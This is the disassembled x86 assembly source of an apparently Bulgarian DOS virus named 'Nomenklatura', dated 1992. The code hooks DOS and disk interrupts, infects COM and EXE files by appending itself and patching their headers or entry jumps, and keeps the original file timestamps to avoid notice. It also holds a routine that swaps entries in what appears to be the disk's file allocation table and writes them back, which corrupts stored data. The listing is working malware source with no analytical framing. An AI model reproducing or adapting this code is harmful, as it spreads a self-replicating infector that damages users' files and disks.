  
PAGE  60,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        NOMNCLTR			         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   19-Jan-92					         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
.286c
  
data_1e		equ	4Ch				; (0000:004C=0E9h)
data_2e		equ	84h				; (0000:0084=9Eh)
data_3e		equ	46Ch				; (0000:046C=66CDh)
data_4e		equ	3				; (5C42:0003=0FFFFh)
data_5e		equ	12h				; (5C42:0012=0)
data_17e	equ	1610h				; (5C43:1610=0)
data_18e	equ	4BAAh				; (5C43:4BAA=0)
data_19e	equ	5C43h				; (5C43:5C43=0)
data_20e	equ	0FE52h				; (5C43:FE52=0)
data_21e	equ	0FFDBh				; (5C43:FFDB=0)
  
code_seg_a	segment
		assume	cs:code_seg_a, ds:code_seg_a
  
  
		org	100h
  
nomncltr	proc	far
  
start:
		jmp	loc_2
		db	35 dup (90h)
data_7		dw	9090h				; Data table (indexed access)
data_8		dw	9090h				; Data table (indexed access)
		db	30 dup (90h)
data_9		dw	9090h				; Data table (indexed access)
		db	651 dup (90h)
data_10		dw	9090h
data_11		dw	9090h
		db	169 dup (90h)
data_12		db	90h
		db	125 dup (90h)
loc_2:
		jmp	loc_34
		db	'Nomenklatura'
		db	0, 80h, 0FCh, 4Bh, 74h, 0Ah
		db	80h, 0FCh
		db	3Dh, 74h
data_13		dd	2EFF2E14h
data_14		dw	3D9h
data_15		db	3Ch
		db	0AAh, 72h
data_16		dw	550Bh
		db	8Bh, 0ECh, 80h, 66h, 6, 0FEh
		db	5Dh, 0B0h, 3, 0CFh, 6, 1Eh
		db	57h, 56h, 55h, 52h, 51h, 53h
		db	50h, 0FCh, 72h, 22h, 0B9h, 80h
		db	0, 8Bh, 0F2h
  
locloop_4:
		lodsb					; String [si] to al
		or	al,al				; Zero ?
		loopnz	locloop_4			; Loop if zf=0, cx>0
  
		mov	cx,432Eh
		sub	si,3
		lodsw					; String [si] to ax
		cmp	ax,4D4Fh
		je	loc_5				; Jump if equal
		cmp	ax,4558h
		jne	loc_9				; Jump if not equal
		mov	ch,ah
loc_5:
		cmp	[si-4],cx
		jne	loc_9				; Jump if not equal
loc_6:
		mov	ax,3D02h
		pushf					; Push flags
		push	cs
		call	sub_1
		jc	loc_9				; Jump if carry Set
		xchg	ax,bx
		push	cs
		pop	ds
		mov	ax,5700h
		int	21h				; DOS Services  ah=function 57h
							;  get/set file date & time
		push	cx
		push	dx
		mov	di,515h
		mov	word ptr [di],12Bh
		mov	[di+2],cs
		mov	word ptr [di+4],3B2h
		mov	[di+6],cs
		call	sub_5
		mov	dx,4FDh
		mov	si,dx
		mov	cl,18h
		mov	ah,3Fh				; '?'
		int	21h				; DOS Services  ah=function 3Fh
							;  read file, cx=bytes, to ds:dx
		jc	loc_8				; Jump if carry Set
		cmp	word ptr [si],5A4Dh
		jne	loc_7				; Jump if not equal
		call	sub_2
		jmp	short loc_8
loc_7:
		call	sub_4
loc_8:
		mov	ax,5701h
		pop	dx
		pop	cx
		int	21h				; DOS Services  ah=function 57h
							;  get/set file date & time
		mov	ah,3Eh				; '>'
		int	21h				; DOS Services  ah=function 3Eh
							;  close file, bx=file handle
		call	sub_5
loc_9:
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
		jmp	loc_3
  
nomncltr	endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		mov	cx,[si+16h]
		add	cx,[si+8]
		mov	ax,10h
		mul	cx				; dx:ax = reg * ax
		add	ax,[si+14h]
		adc	dx,0
		push	dx
		push	ax
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		int	21h				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
		test	dx,dx
		jnz	loc_10				; Jump if not zero
		cmp	ax,400h
		jae	loc_10				; Jump if above or =
		pop	ax
		pop	dx
		ret
loc_10:
		mov	di,ax
		mov	bp,dx
		pop	cx
		sub	ax,cx
		pop	cx
		sbb	dx,cx
		cmp	word ptr [si+0Ch],0
		je	loc_ret_13			; Jump if equal
		test	dx,dx
		jnz	loc_11				; Jump if not zero
		cmp	ax,400h
		je	loc_ret_13			; Jump if equal
loc_11:
		mov	dx,bp
		mov	ax,di
		push	dx
		push	ax
		add	ax,400h
		adc	dx,0
		mov	cx,200h
		div	cx				; ax,dx rem=dx:ax/reg
		mov	[si+2],dx
		test	dx,dx
		jz	loc_12				; Jump if zero
		inc	ax
loc_12:
		mov	[si+4],ax
		pop	ax
		pop	dx
		mov	di,10h
		div	di				; ax,dx rem=dx:ax/reg
		sub	ax,[si+8]
		les	di,dword ptr [si+14h]		; Load 32 bit ptr
		mov	data_10,di			; (5C43:03D5=9090h)
		mov	data_11,es			; (5C43:03D7=9090h)
		mov	[si+14h],dx
		mov	[si+16h],ax
		call	sub_3
		jc	loc_ret_13			; Jump if carry Set
		mov	ah,40h				; '@'
		mov	dx,si
		mov	cx,18h
		int	21h				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
  
loc_ret_13:
		ret
sub_2		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		mov	ah,40h				; '@'
		mov	cx,400h
		mov	dx,100h
		int	21h				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
		xor	cx,ax
		cmc					; Complement carry
		jnz	loc_ret_14			; Jump if not zero
		mov	ax,4200h
		mov	dx,cx
		int	21h				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
  
loc_ret_14:
		ret
sub_3		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_4		proc	near
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		int	21h				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
		cmp	ax,400h
		jb	loc_ret_17			; Jump if below
		cmp	ax,0FA00h
		jae	loc_ret_17			; Jump if above or =
		push	ax
		cmp	byte ptr [si],0E9h
		jne	loc_16				; Jump if not equal
		sub	ax,403h
		cmp	ax,[si+1]
		jne	loc_16				; Jump if not equal
loc_15:
		pop	ax
		ret
loc_16:
		call	sub_3
		jc	loc_15				; Jump if carry Set
		pop	ax
		sub	ax,3
		mov	dx,3D5h
		mov	si,dx
		mov	byte ptr cs:[si],0E9h
		mov	cs:[si+1],ax
		mov	ah,40h				; '@'
		mov	cx,3
		int	21h				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
  
loc_ret_17:
		ret
sub_4		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
		xor	ax,ax				; Zero register
		mov	es,ax
		mov	si,515h
		mov	di,90h
		mov	cx,2
  
locloop_18:
		lodsw					; String [si] to ax
		xchg	ax,dx
		lodsw					; String [si] to ax
		xchg	dx,es:[di]
		xchg	ax,es:[di+2]
		mov	[si-4],dx
		mov	[si-2],ax
		mov	di,4Ch
		loop	locloop_18			; Loop if cx > 0
  
		ret
sub_5		endp
  
		db	2Eh, 80h, 3Eh, 1Fh, 5, 0
		db	74h, 12h, 41h, 75h, 0Eh, 32h
		db	0E4h, 2Eh, 86h, 26h, 1Fh, 5
		db	0F5h, 2Eh, 8Bh, 0Eh, 22h, 5
		db	41h, 49h, 9Ch, 50h, 9Ch, 0Eh
		db	0E8h, 0EFh, 0, 73h, 7, 83h
		db	0C4h, 4, 0F9h, 0E9h, 0C8h, 0
loc_19:
		pop	ax
		sub	ah,2
		cmp	ah,2
		jae	loc_28				; Jump if above or =
		push	bx
		push	cx
		push	si
		push	ds
loc_20:
		push	ax
		push	bx
		push	cx
		push	dx
		xor	dx,dx				; Zero register
		mov	cx,100h
		mov	si,bx
		push	si
  
locloop_21:
		lods	word ptr es:[si]		; String [si] to ax
		dec	ax
		cmp	ax,0FFF5h
		jae	loc_23				; Jump if above or =
		cmp	ax,bx
		jne	loc_22				; Jump if not equal
		inc	dh
loc_22:
		xchg	ax,bx
		inc	dx
		inc	bx
loc_23:
		loop	locloop_21			; Loop if cx > 0
  
		pop	si
		shr	dl,1				; Shift w/zeros fill
		clc					; Clear carry flag
		jz	loc_25				; Jump if zero
		cmp	dl,dh
		jae	loc_25				; Jump if above or =
		clc					; Clear carry flag
		push	cs
		pop	ds
		mov	bx,520h
		inc	word ptr [bx]
		jnz	loc_25				; Jump if not zero
		inc	word ptr ds:data_20e[bx]	; (5C43:FE52=0)
		mov	al,ds:data_21e[bx]		; (5C43:FFDB=0)
		add	al,0F8h
		jnc	loc_24				; Jump if carry=0
		mov	al,0FFh
loc_24:
		mov	[bx+1],al
		xor	bx,bx				; Zero register
		mov	ds,bx
		mov	ax,ds:data_3e			; (0000:046C=66D9h)
		xchg	bl,ah
		add	bx,bx
		add	bx,si
		add	ax,ax
		add	si,ax
		push	es
		pop	ds
		mov	ax,[bx]
		xchg	ax,[si]
		mov	[bx],ax
		stc					; Set carry flag
loc_25:
		pop	dx
		pop	cx
		pop	bx
		jnc	loc_26				; Jump if carry=0
		mov	ax,301h
		pushf					; Push flags
		push	cs
		call	sub_7
loc_26:
		pop	ax
		jc	loc_27				; Jump if carry Set
		dec	al
		jnz	loc_20				; Jump if not zero
loc_27:
		pop	ds
		pop	si
		pop	cx
		pop	bx
loc_28:
		pop	ax
		shr	ax,1				; Shift w/zeros fill
		jnc	loc_31				; Jump if carry=0
		mov	ax,100h
		jmp	short loc_32
		db	0, 0, 2Eh, 0FFh, 36h, 1Dh
		db	5, 9Dh, 74h, 50h, 2Eh, 88h
		db	26h, 1Fh, 5, 2Eh, 89h, 0Eh
		db	22h, 5, 2Eh, 3Ah, 26h, 82h
		db	4, 75h, 3, 80h, 0F4h, 1
loc_29:
		push	cx
		mov	cx,0FFFFh
		pushf					; Push flags
		push	cs
		call	sub_6
		pop	cx
		pushf					; Push flags
		cmp	cs:data_15,0			; (5C43:051F=3Ch)
loc_30:
		jne	loc_30				; Jump if not equal
		popf					; Pop flags
		jnc	loc_32				; Jump if carry=0
		cmp	ah,1
		stc					; Set carry flag
		jnz	loc_32				; Jump if not zero
loc_31:
		xor	ax,ax				; Zero register
loc_32:
		sti					; Enable interrupts
		ret	2				; Return far
		db	2Eh, 3Ah, 26h, 83h, 4, 74h
		db	0F3h, 84h, 0E4h, 74h, 0EFh, 80h
		db	0FCh, 1, 74h, 5, 80h, 0FCh
		db	5, 72h, 0ADh
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		jmp	cs:data_13			; (5C43:0519=2E14h)
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_7:
loc_33:
		jmp	far ptr loc_37
sub_6		endp
  
loc_34:
		push	ds
		call	sub_8
		push	cs
		add	[di],dl
		add	ss:data_17e[bp],bx		; (5C43:1610=0)
		add	ds:data_18e[bx+si],di		; (5C43:4BAA=0)
		int	21h				; DOS Services  ah=function 03h
							;  get char al from serial port
		jnc	loc_35				; Jump if carry=0
		pop	si
		push	si
		push	es
		xor	ax,ax				; Zero register
		mov	ds,ax
		les	bx,dword ptr ds:data_1e		; (0000:004C=0FE9h) Load 32 bit ptr
		mov	ah,13h
		int	2Fh				; Multiplex/Spooler al=func 00h
							;  get installed status
		push	es
		push	bx
		mov	ah,13h
		int	2Fh				; Multiplex/Spooler al=func 00h
							;  get installed status
		pop	word ptr cs:[si-8]
		pop	bx
		mov	cs:[si-6],bx
		mov	ax,es
		cmp	ax,bx
		les	bx,dword ptr ds:data_2e		; (0000:0084=109Eh) Load 32 bit ptr
		push	cs
		pop	ds
		pushf					; Push flags
		pop	data_9[si]			; (5C43:0148=9090h)
		mov	[si+4],bx
		mov	[si+6],es
		pop	ax
		dec	ax
		mov	ds,ax
		mov	bx,43h
		sub	ds:data_5e,bx			; (5C42:0012=0)
		sub	ds:data_4e,bx			; (5C42:0003=0FFFFh)
		inc	ax
		add	ax,ds:data_4e			; (5C42:0003=0FFFFh)
		push	ax
		sub	ax,10h
		push	ax
		mov	ds,ax
		mov	dx,2BCh
		mov	ah,13h
		int	2Fh				; Multiplex/Spooler al=func 32h
		pop	dx
		pop	es
		xor	di,di				; Zero register
		push	cs
		pop	ds
		inc	data_7[si]			; (5C43:0126=9090h)
		sub	si,2D5h
		mov	cx,41Fh
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	ax,0FE00h
		stosb					; Store al to es:[di]
		stosw					; Store ax to es:[di]
		mov	es,cx
		mov	di,84h
		mov	ax,110h
		stosw					; Store ax to es:[di]
		xchg	ax,dx
		stosw					; Store ax to es:[di]
loc_35:
		pop	si
		pop	es
		push	cs
		pop	ds
		xor	ax,ax				; Zero register
		cmp	data_8[si],5A4Dh		; (5C43:0128=9090h)
		jne	loc_36				; Jump if not equal
		mov	dx,es
		add	dx,10h
		add	[si+2],dx
		push	es
		pop	ds
		jmp	dword ptr cs:[si]		; 1 entry
loc_36:
		sub	si,0FED8h
		mov	di,100h
		push	di
		movsw					; Mov [si] to es:[di]
		movsb					; Mov [si] to es:[di]
		ret
		db	3, 4, 92h, 0AEh, 0A7h, 0A8h
		db	20h, 0A4h, 0A5h, 0A1h, 0A5h, 0ABh
		db	20h, 0A8h, 0A4h, 0A8h, 0AEh, 0B2h
		db	20h, 0A2h, 0ACh, 0A5h, 0B1h, 0B2h
		db	0AEh, 20h, 0A4h, 0A0h, 20h, 0B6h
		db	0A5h, 0ABh, 0B3h, 0ADh, 0A5h, 20h
		db	0B1h, 0AEh, 0B7h, 0ADh, 0A8h, 0B2h
		db	0A5h, 20h, 0B3h, 0B1h, 0B2h, 0ADh
		db	0A8h, 20h, 0ADh, 0A0h, 20h, 0ACh
		db	0AEh, 0ACh, 0A8h, 0B7h, 0A5h, 0B2h
		db	0AEh, 2Ch, 20h, 0A2h, 0AFh, 0A8h
		db	20h, 0B3h, 0B1h, 0B2h, 0ADh, 0A8h
		db	20h, 0B2h, 0A0h, 0ACh, 2Ch, 20h
		db	0AAh, 0BAh, 0A4h, 0A5h, 0B2h, 0AEh
		db	20h, 0B2h, 0B0h, 0BFh, 0A1h, 0A2h
		db	0A0h, 0B8h, 0A5h, 20h, 0A4h, 0A0h
		db	20h, 0B1h, 0ABh, 0AEh, 0A6h, 0A8h
		db	20h, 0B1h, 0BAh, 0A2h, 0B1h, 0A5h
		db	0ACh, 20h, 0A4h, 0B0h, 0B3h, 0A3h
		db	0AEh, 20h, 0ADh, 0A5h, 0B9h, 0AEh
		db	0, 4, 0, 0CDh, 20h, 90h
  
code_seg_a	ends
  
  
  
		end	start
